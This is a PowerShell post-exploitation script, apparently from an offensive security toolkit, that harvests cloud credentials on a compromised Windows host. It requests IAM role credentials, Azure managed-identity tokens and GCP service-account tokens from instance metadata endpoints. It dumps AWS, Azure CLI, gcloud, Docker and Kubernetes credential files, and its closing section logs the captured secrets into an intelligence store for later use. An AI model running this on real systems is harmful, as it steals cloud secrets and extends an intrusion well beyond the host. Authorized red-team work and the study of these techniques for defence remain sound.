# gather/windows/enum-cloud-credentials.ps1 — Cloud credential and identity enumeration on Windows
# Requires: Any user (IMDS accessible from instance without privilege)
# Read-only: YES — read-only queries only
# Footprint: Zero (no temp files, no disk writes)
# Purpose: Detect attached cloud identities, IAM roles, managed identities, and service accounts.
#          A compromised Windows cloud instance may have an attached role with blast radius
#          far beyond the instance itself (S3, SSM, Key Vault, Compute Engine APIs, etc.).
#
# Covers: AWS EC2 (IMDSv1/v2), Azure VM (Managed Identity), GCP Compute Engine
#
# Run inline: remote_exec(session="host01", command="<paste>")

$ErrorActionPreference = 'SilentlyContinue'

function Sec($n) { Write-Output "`n=== $n ===" }

$timeout = 2  # seconds for IMDS requests

function TryGet($uri, $headers = @{}) {
  try {
    $r = Invoke-RestMethod -Uri $uri -Headers $headers -TimeoutSec $timeout -UseBasicParsing
    return $r
  } catch { return $null }
}

function TryGetRaw($uri, $headers = @{}, $method = 'GET', $body = $null) {
  try {
    $params = @{ Uri = $uri; Headers = $headers; TimeoutSec = $timeout; UseBasicParsing = $true; Method = $method }
    if ($body) { $params['Body'] = $body }
    return Invoke-RestMethod @params
  } catch { return $null }
}

Sec 'CLOUD CREDENTIAL ENUMERATION HEADER'
Write-Output "Host:      $env:COMPUTERNAME"
Write-Output "Timestamp: $((Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ'))"

Sec 'ENVIRONMENT DETECTION'
Write-Output "--- Hypervisor and system product name ---"
(Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).Model
(Get-CimInstance Win32_BIOS -ErrorAction SilentlyContinue).Version
(Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue).Manufacturer

$sysInfo = (Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).Model
if ($sysInfo -match 'HVM domU|Amazon') { Write-Output "[!] Likely AWS EC2" }
if ($sysInfo -match 'Virtual Machine|Hyper-V')  { Write-Output "[?] Likely Azure VM or Hyper-V" }
if ($sysInfo -match 'Google')                   { Write-Output "[!] Likely GCP" }

Write-Output "`n--- Environment variables (cloud credential clues) ---"
[System.Environment]::GetEnvironmentVariables() | Where-Object {
  $_.Key -match 'AWS_|AZURE_|GOOGLE_|GCP_|MSI_|IDENTITY_'
} | Format-List

Sec 'AWS EC2 — INSTANCE METADATA SERVICE (IMDSv1/v2)'
# IMDSv2: PUT to get a session token, then GET with that token
Write-Output "--- Requesting IMDSv2 session token ---"
$awsToken = TryGetRaw 'http://169.254.169.254/latest/api/token' `
  @{'X-aws-ec2-metadata-token-ttl-seconds' = '21600'} 'PUT'

if ($awsToken) {
  Write-Output "[INFO] IMDSv2 token obtained"
  $awsHeaders = @{'X-aws-ec2-metadata-token' = $awsToken}
} else {
  Write-Output "(IMDSv2 token unavailable — trying IMDSv1)"
  $awsHeaders = @{}
}

Write-Output "`n--- Identity document ---"
$identity = TryGet 'http://169.254.169.254/latest/dynamic/instance-identity/document' $awsHeaders
if ($identity) {
  Write-Output "[!] AWS EC2 INSTANCE DETECTED"
  $identity | Format-List accountId, region, instanceId, instanceType, privateIp, availabilityZone
} else {
  Write-Output "(IMDS not reachable — not EC2, or IMDS disabled)"
}

Write-Output "`n--- Attached IAM role ---"
$iamRoleName = TryGet 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' $awsHeaders
if ($iamRoleName) {
  Write-Output "[!] IAM ROLE ATTACHED: $iamRoleName"
  $creds = TryGet "http://169.254.169.254/latest/meta-data/iam/security-credentials/$iamRoleName" $awsHeaders
  if ($creds) {
    Write-Output "AccessKeyId: $($creds.AccessKeyId)"
    Write-Output "Type:        $($creds.Type)"
    Write-Output "Expiration:  $($creds.Expiration)"
    if ($creds.Expiration) {
      $exp = [datetime]$creds.Expiration
      $diff = $exp - (Get-Date).ToUniversalTime()
      Write-Output "[!] Token expires in: $([int]$diff.TotalMinutes) minutes"
    }
    Write-Output "SecretAccessKey present: $($null -ne $creds.SecretAccessKey)"
    Write-Output "SessionToken present:    $($null -ne $creds.Token)"
  }
} else {
  Write-Output "(no IAM role attached, or IMDS not reachable)"
}

Sec 'AWS — STATIC CREDENTIALS'
Write-Output "--- AWS environment variables ---"
$awsEnvVars = [System.Environment]::GetEnvironmentVariables() | Where-Object { $_.Key -match '^AWS_' }
if ($awsEnvVars) {
  $awsEnvVars | Format-List
} else {
  Write-Output "(none)"
}

Write-Output "`n--- AWS credential files ---"
$credPaths = @(
  "$env:USERPROFILE\.aws\credentials",
  "$env:USERPROFILE\.aws\config",
  "C:\Users\*\.aws\credentials",
  "C:\ProgramData\aws\credentials"
)
foreach ($path in $credPaths) {
  $expanded = Resolve-Path $path -ErrorAction SilentlyContinue
  foreach ($f in $expanded) {
    if (Test-Path $f) {
      Write-Output "[!] Found: $f"
      Get-Content $f | Select-Object -First 20
    }
  }
}

Sec 'AZURE — INSTANCE METADATA SERVICE'
Write-Output "--- Azure IMDS instance info ---"
$azureInstance = TryGet 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' `
  @{'Metadata' = 'true'}
if ($azureInstance) {
  Write-Output "[!] AZURE VM DETECTED"
  $azureInstance.compute | Select-Object name, vmId, location, resourceGroupName, subscriptionId, vmSize |
    Format-List
} else {
  Write-Output "(not Azure IMDS, or not reachable)"
}

Write-Output "`n--- Azure managed identity token ---"
$msiToken = TryGet `
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' `
  @{'Metadata' = 'true'}
if ($msiToken) {
  Write-Output "[!] MANAGED IDENTITY TOKEN OBTAINED"
  Write-Output "token_type:  $($msiToken.token_type)"
  Write-Output "expires_on:  $($msiToken.expires_on)"
  if ($msiToken.expires_on) {
    $unixEpoch = [datetime]'1970-01-01T00:00:00Z'
    $expiry = $unixEpoch.AddSeconds([double]$msiToken.expires_on)
    $diff = $expiry - (Get-Date).ToUniversalTime()
    Write-Output "[!] Token expires in: $([int]$diff.TotalMinutes) minutes"
  }
  Write-Output "access_token (first 40 chars): $($msiToken.access_token.Substring(0, [Math]::Min(40, $msiToken.access_token.Length)))..."
} else {
  Write-Output "(no managed identity, or not Azure)"
}

Write-Output "`n--- Azure CLI token cache ---"
$azCliPaths = @(
  "$env:USERPROFILE\.azure\accessTokens.json",
  "$env:USERPROFILE\.azure\msal_token_cache.json",
  "C:\Users\*\.azure\accessTokens.json"
)
foreach ($path in $azCliPaths) {
  $expanded = Resolve-Path $path -ErrorAction SilentlyContinue
  foreach ($f in $expanded) {
    if (Test-Path $f) {
      Write-Output "[!] Azure CLI tokens: $f"
      Get-Content $f | Select-Object -First 5
    }
  }
}

Sec 'GCP — INSTANCE METADATA SERVICE'
Write-Output "--- GCP instance identity ---"
$gcpMeta = TryGet 'http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true' `
  @{'Metadata-Flavor' = 'Google'}
if ($gcpMeta) {
  Write-Output "[!] GCP COMPUTE INSTANCE DETECTED"
  $gcpMeta | Select-Object id, name, zone, machineType | Format-List
} else {
  # Also try the numeric IMDS address GCP exposes
  $gcpMeta2 = TryGet 'http://169.254.169.254/computeMetadata/v1/instance/?recursive=true' `
    @{'Metadata-Flavor' = 'Google'}
  if ($gcpMeta2) {
    Write-Output "[!] GCP COMPUTE INSTANCE DETECTED (via 169.254.169.254)"
    $gcpMeta2 | Select-Object id, name, zone | Format-List
  } else {
    Write-Output "(not GCP, or metadata not reachable)"
  }
}

Write-Output "`n--- GCP service account ---"
$gcpSa = TryGet 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/' `
  @{'Metadata-Flavor' = 'Google'}
if ($gcpSa) {
  Write-Output "[!] SERVICE ACCOUNT: $gcpSa"
  $saName = ($gcpSa -split "`n")[0].Trim('/')
  $gcpToken = TryGet "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$saName/token" `
    @{'Metadata-Flavor' = 'Google'}
  if ($gcpToken) {
    Write-Output "token_type:  $($gcpToken.token_type)"
    Write-Output "expires_in:  $($gcpToken.expires_in) seconds"
  }
} else {
  Write-Output "(no service account, or not GCP)"
}

Write-Output "`n--- GCP ADC credential files ---"
$gcpPaths = @(
  "$env:APPDATA\gcloud\application_default_credentials.json",
  "$env:USERPROFILE\.config\gcloud\application_default_credentials.json",
  "C:\Users\*\AppData\Roaming\gcloud\application_default_credentials.json"
)
foreach ($path in $gcpPaths) {
  $expanded = Resolve-Path $path -ErrorAction SilentlyContinue
  foreach ($f in $expanded) {
    if (Test-Path $f) {
      Write-Output "[!] GCP ADC: $f"
      Get-Content $f | Select-Object -First 5
    }
  }
}

Sec 'GENERIC — OTHER CLOUD CREDENTIAL SOURCES'
Write-Output "--- Docker config credentials ---"
$dockerPaths = @(
  "$env:USERPROFILE\.docker\config.json",
  "C:\Users\*\.docker\config.json"
)
foreach ($path in $dockerPaths) {
  $expanded = Resolve-Path $path -ErrorAction SilentlyContinue
  foreach ($f in $expanded) {
    if (Test-Path $f) {
      Write-Output "[!] Docker config: $f"
      Get-Content $f | Select-Object -First 10
    }
  }
}

Write-Output "`n--- Kubernetes service account (if containerised) ---"
$k8sToken = 'C:\var\run\secrets\kubernetes.io\serviceaccount\token'
if (Test-Path $k8sToken) {
  Write-Output "[!] K8s service account token present: $k8sToken"
  (Get-Content $k8sToken -Raw).Substring(0, [Math]::Min(200, (Get-Content $k8sToken -Raw).Length))
}

Sec 'RECORDING GUIDANCE'
Write-Output @"
Cloud identity/role credential:
  bin/intel-snippet cloud-role --provider aws|azure|gcp --role-name <name> --source-host $env:COMPUTERNAME

  Or directly:
  intel_add(category="credential", id="<cloud-role-id>",
    data="type: token`nusername: <role-name>`nsecret: <access-key>/<token>`n
          status: active`nnotes: IAM role attached — blast radius is the role policies`n
          source:`n  host: $env:COMPUTERNAME`n  method: cloud IMDS`n  playbook: windows/enum-cloud-credentials.ps1",
    summary="Cloud identity <role-name> attached to $env:COMPUTERNAME")
"@
